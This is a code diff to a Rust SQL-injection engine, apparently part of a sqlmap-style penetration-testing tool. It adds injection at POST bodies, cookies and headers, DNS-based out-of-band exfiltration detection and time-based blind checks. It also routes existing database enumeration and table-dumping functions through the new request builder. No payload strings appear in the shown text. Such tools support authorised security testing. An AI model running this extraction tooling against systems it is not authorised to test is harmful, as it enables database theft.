@@ -11,6 +11,7 @@
 //! - os_shell: OS command execution
 
 pub mod core;
+pub mod errors;
 pub mod request;
 pub mod techniques;
 pub mod tamper;
@@ -90,8 +91,17 @@ pub struct SqliEngine<'a> {
     client: &'a HttpClient,
     url: Option<Url>,
     parameter: Option<String>,
+    /// Optional injection-point template. When set, every request injects at the
+    /// configured location (form/JSON body, cookie, header) instead of the URL
+    /// query string. When `None`, falls back to query-string GET injection.
+    injection: Option<request::InjectionPoint>,
+    /// Out-of-band callback domain for DNS-based exfiltration detection.
+    oob_callback: Option<String>,
     pub vector: Option<UnionVector>,
     pub db_type: DBMS,
+    /// Which technique confirmed the most recent detection (for accurate
+    /// reporting). `None` until `detect` succeeds.
+    pub technique: Option<SqliTechnique>,
 }
 
 impl<'a> SqliEngine<'a> {
@@ -100,8 +110,41 @@ impl<'a> SqliEngine<'a> {
             client,
             url: None,
             parameter: None,
+            injection: None,
+            oob_callback: None,
             vector: None,
             db_type: DBMS::Unknown,
+            technique: None,
+        }
+    }
+
+    /// Construct an engine that injects at the given injection point (e.g. a
+    /// POST form/JSON field) rather than the default URL query string.
+    pub fn with_injection_point(client: &'a HttpClient, point: request::InjectionPoint) -> Self {
+        Self {
+            client,
+            url: None,
+            parameter: None,
+            injection: Some(point),
+            oob_callback: None,
+            vector: None,
+            db_type: DBMS::Unknown,
+            technique: None,
+        }
+    }
+
+    /// Set the out-of-band callback domain used for DNS-exfiltration detection.
+    pub fn with_oob_callback(mut self, callback: Option<String>) -> Self {
+        self.oob_callback = callback;
+        self
+    }
+
+    /// Build a `Request` for the given URL/param, honouring the injection-point
+    /// template if one was configured.
+    fn make_request(&self, url: &Url, param: &str) -> Request<'a> {
+        match &self.injection {
+            Some(point) => Request::with_point(self.client, point.clone()),
+            None => Request::new(self.client, url.clone(), param.to_string()),
         }
     }
 
@@ -110,30 +153,56 @@ impl<'a> SqliEngine<'a> {
         self.url = Some(url.clone());
         self.parameter = Some(param.to_string());
         
-        let request = Request::new(self.client, url.clone(), param.to_string());
+        let request = self.make_request(url, param);
 
-        // Try UNION-based first (most powerful)
+        // Try UNION-based first (the only technique that also enables full data
+        // extraction, so it is preferred when present).
         tracing::info!("Testing UNION-based SQL injection...");
         if let Some(union_vector) = check_union(&request).await? {
             self.db_type = union_vector.dbms;
             self.vector = Some(union_vector);
+            self.technique = Some(SqliTechnique::Union);
             return Ok(true);
         }
 
-        // Try error-based
+        // Error-based. No column info for extraction, but it is a confirmed
+        // injection and must be reported.
         tracing::info!("Testing error-based SQL injection...");
         if let Some(error_vector) = check_error_based(&request).await? {
             self.db_type = error_vector.dbms;
-            // Convert to union-like vector for compatibility
-            // Error-based doesn't have column info, so we can't use it for data extraction
-            return Ok(false); // For now, only support UNION
+            self.technique = Some(SqliTechnique::Error);
+            return Ok(true);
         }
 
-        // Try boolean-based blind
+        // Boolean-based blind.
         tracing::info!("Testing boolean-based blind SQL injection...");
-        if let Some(_blind_vector) = check_boolean_blind(&request).await? {
-            // Blind is too slow for full enumeration
-            return Ok(false);
+        if let Some(blind_vector) = check_boolean_blind(&request).await? {
+            self.db_type = blind_vector.dbms;
+            self.technique = Some(SqliTechnique::Boolean);
+            return Ok(true);
+        }
+
+        // Time-based blind.
+        tracing::info!("Testing time-based blind SQL injection...");
+        if let Some(time_vector) = check_time_blind(&request).await? {
+            self.db_type = time_vector.dbms;
+            self.technique = Some(SqliTechnique::Time);
+            return Ok(true);
+        }
+
+        // Out-of-band DNS exfiltration (last resort; needs the OOB DNS listener
+        // running and the callback domain delegated to it).
+        if let Some(ref domain) = self.oob_callback {
+            tracing::info!("Testing DNS-based out-of-band SQL injection...");
+            if let Some(dns_vector) = check_dns_exfiltration(&request, domain).await? {
+                self.db_type = dns_vector.dbms;
+                self.technique = Some(SqliTechnique::Stacked);
+                tracing::warn!(
+                    "[SQLi OOB] DNS exfiltration confirmed (DBMS: {})",
+                    dns_vector.dbms
+                );
+                return Ok(true);
+            }
         }
 
         Ok(false)
@@ -141,7 +210,7 @@ impl<'a> SqliEngine<'a> {
 
     /// Get current database
     pub async fn get_current_db(&self, url: &Url, param: &str) -> Result<Option<String>> {
-        let request = Request::new(self.client, url.clone(), param.to_string());
+        let request = self.make_request(url, param);
         
         if let Some(ref v) = self.vector {
             let result = get_current_db(&request, v).await?;
@@ -154,7 +223,7 @@ impl<'a> SqliEngine<'a> {
 
     /// Get all databases
     pub async fn get_dbs(&self, url: &Url, param: &str) -> Result<Vec<String>> {
-        let request = Request::new(self.client, url.clone(), param.to_string());
+        let request = self.make_request(url, param);
         
         if let Some(ref v) = self.vector {
             return get_databases(&request, v).await;
@@ -164,7 +233,7 @@ impl<'a> SqliEngine<'a> {
 
     /// Get tables in a database
     pub async fn get_tables(&self, url: &Url, param: &str, database: &str) -> Result<Vec<String>> {
-        let request = Request::new(self.client, url.clone(), param.to_string());
+        let request = self.make_request(url, param);
         
         if let Some(ref v) = self.vector {
             return get_tables(&request, v, database).await;
@@ -174,7 +243,7 @@ impl<'a> SqliEngine<'a> {
 
     /// Get columns in a table
     pub async fn get_columns(&self, url: &Url, param: &str, database: &str, table: &str) -> Result<Vec<String>> {
-        let request = Request::new(self.client, url.clone(), param.to_string());
+        let request = self.make_request(url, param);
         
         if let Some(ref v) = self.vector {
             return get_columns(&request, v, database, table).await;
@@ -184,7 +253,7 @@ impl<'a> SqliEngine<'a> {
 
     /// Dump table data
     pub async fn dump_table(&self, url: &Url, param: &str, database: &str, table: &str, columns: &[String]) -> Result<Vec<Vec<String>>> {
-        let request = Request::new(self.client, url.clone(), param.to_string());
+        let request = self.make_request(url, param);
         
         if let Some(ref v) = self.vector {
             return dump_table(&request, v, database, table, columns).await;
